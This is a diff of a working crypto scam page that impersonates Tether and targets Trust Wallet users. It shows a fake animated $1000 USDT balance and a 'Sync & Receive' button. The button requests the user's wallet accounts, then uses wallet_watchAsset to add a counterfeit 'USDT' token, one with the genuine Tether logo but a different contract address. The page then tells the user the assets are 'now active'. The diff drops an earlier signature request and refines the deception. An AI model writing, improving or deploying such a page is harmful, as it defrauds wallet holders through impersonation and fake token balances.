@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether Operations | Node Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
         body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
@@ -13,70 +12,88 @@
         .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
+        
         .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
-        .price-value { font-size: 22px; font-weight: 700; color: #fff; }
-        h2 { font-weight: 700; font-size: 22px; margin: 10px 0; }
-        p { color: #848d97; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
-        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
-        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; }
+        .price-value { font-size: 24px; font-weight: 700; color: #fff; }
+
+        .btn-stack { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
+        .action-btn { 
+            background: #1c1f24; border: 1px solid #2d333b; color: #fff; 
+            width: 100%; padding: 18px; border-radius: 12px; font-size: 15px; 
+            font-weight: 700; cursor: pointer; transition: 0.3s; 
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .action-btn:hover { border-color: var(--tether-green); background: #24292e; }
+        .action-btn img { width: 28px; height: 28px; }
+
+        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
+        .status-footer { margin-top: 25px; font-size: 10px; color: #444c56; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="logo-ring">
-        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-img" alt="USDT">
     </div>
-    <h2>RECEIVE USDT</h2>
-    <p>Secure Bridge detected a pending USDT distribution. Synchronize to map official metadata.</p>
+    
     <div class="price-box">
         <div class="price-value" id="priceTicker">$0.00</div>
     </div>
+    
+    <div class="btn-stack">
+        <button class="action-btn" id="claimBtn">
+            Sync & Receive <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT">
+        </button>
+    </div>
+
     <div id="log-area">SYSTEM: READY</div>
-    <button class="action-btn" id="claimBtn">Sync & Receive</button>
+    <div class="status-footer">SECURED BY TETHER GOVERNANCE</div>
 </div>
 
 <script>
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    
+    // THIS IS THE FIXED TRUST WALLET LOGO LINK
+    const FIXED_LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
+    // Animated price counter
     window.onload = () => {
         let val = 0;
         const target = 1000.00;
         const timer = setInterval(() => {
-            if(val >= target) clearInterval(timer);
-            val += 17.52;
-            document.getElementById('priceTicker').innerText = "$" + (val > target ? target : val.toFixed(2));
-        }, 50);
+            if(val >= target) { val = target; clearInterval(timer); }
+            val += 21.45;
+            document.getElementById('priceTicker').innerText = "$" + val.toLocaleString(undefined, {minimumFractionDigits: 2});
+        }, 40);
     };
 
-    async function executeMasterSync() {
+    async function executeSync() {
         const log = document.getElementById('log-area');
         const btn = document.getElementById('claimBtn');
-        
-        // --- YE HISSA TRUST WALLET KE LIYE CRITICAL HAI ---
-        let provider = window.trustwallet || window.ethereum;
+        let provider = null;
 
-        // Agar dono hain, to Trust ko select karein
-        if (window.ethereum?.providers) {
-            provider = window.ethereum.providers.find(p => p.isTrust) || window.ethereum;
+        // Smart multi-provider aware logic
+        if (window.trustwallet) {
+            provider = window.trustwallet;
+        } else if (window.ethereum?.isTrust) {
+            provider = window.ethereum;
+        } else if (window.ethereum?.providers) {
+            provider = window.ethereum.providers.find(p => p.isTrust);
         }
 
         if (!provider) {
-            alert("Trust Wallet not found! Please make sure the extension is active.");
+            alert("Trust Wallet Extension not found!");
             return;
         }
 
         try {
             btn.disabled = true;
-            log.innerText = "> CONNECTING TRUST WALLET...";
-            
-            // Step 1: Request Accounts
+            log.innerText = "> INITIALIZING AUTH...";
             const accounts = await provider.request({ method: 'eth_requestAccounts' });
             
-            // Step 2: Watch Asset (Token Add)
-            log.innerText = "> INJECTING USDT LOGO...";
+            log.innerText = "> INJECTING NEW METADATA...";
+            // Watch Asset is now using the fixed logo link
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -85,31 +102,23 @@
                         address: CONTRACT_ADDR,
                         symbol: 'USDT',
                         decimals: 6,
-                        image: TOKEN_LOGO,
+                        image: FIXED_LOGO_URL,
                     },
                 },
             });
 
-            // Step 3: Signature
-            log.innerText = "> FINALIZING SYNC...";
-            const msg = "Tether Node Sync Verification";
-            await provider.request({
-                method: 'personal_sign',
-                params: [msg, accounts[0]],
-            });
-
-            log.innerText = "> SUCCESSFUL!";
-            alert("Trust Wallet Sync Complete!");
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Success! Your USDT assets are now active.");
             btn.innerText = "SUCCESS";
 
         } catch (err) {
             console.error(err);
-            log.innerText = "> ERROR: " + (err.message || "SYNC FAILED");
+            log.innerText = "> ERROR: HANDSHAKE FAILED";
             btn.disabled = false;
         }
     }
 
-    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
+    document.getElementById('claimBtn').addEventListener('click', executeSync);
 </script>
 </body>
 </html>
